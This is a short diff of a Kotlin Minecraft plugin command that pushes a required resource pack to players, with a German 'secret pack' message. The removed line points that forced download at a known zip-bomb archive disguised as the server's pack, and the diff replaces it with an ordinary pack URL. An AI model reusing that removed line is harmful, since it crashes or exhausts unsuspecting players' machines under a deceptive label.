@@ -17,8 +17,7 @@ class DownloadCommand : CommandExecutor {
         sender.sendMessage("§aDownloading...")
 
 
-        //sender.setResourcePack("https://cdn.devsky.one/zips/MineBricks.zip", "79b6fa715d53ab97b83f642b2902ed37ff4b4d0a", true)
-        sender.setResourcePack("https://www.bamsoftware.com/hacks/zipbomb/zblg.zip", "577317e75e1709e6026b436671d9643070c58f44", true, text("<gold><b>CringePvP</b></gold> <dark_gray>×</dark_gray> <gray>ResourcePack</gray>\n" +
+        sender.setResourcePack("https://cdn.devsky.one/zips/MineBricks.zip", "79b6fa715d53ab97b83f642b2902ed37ff4b4d0a", true, text("<gold><b>CringePvP</b></gold> <dark_gray>×</dark_gray> <gray>ResourcePack</gray>\n" +
                 "<i><gray>Du hast unser geheimes Pack gefunden.\n" +
                 "Aktiviere es jetzt!</gray></i>"))
         return true
